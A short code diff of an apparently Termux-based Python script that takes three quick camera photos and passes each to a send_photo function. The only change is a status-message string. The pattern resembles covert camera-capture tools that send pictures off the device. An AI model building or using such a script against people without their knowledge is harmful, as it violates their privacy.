@@ -21,7 +21,7 @@ def send_photo(photo_path, caption="✔️"):
 def capture_and_send(camera_id, label):
     for i in range(3):
         filename = f"/sdcard/{label}_{i+1}.jpg"
-        print(f"[+] التقاط {label} {i+1}")
+        print(f"[+] 🇾🇪 {label} {i+1}")
         os.system(f"termux-camera-photo -c {camera_id} {filename}")
         time.sleep(0.2)
         send_photo(filename, f"✔️ {label} {i+1}")
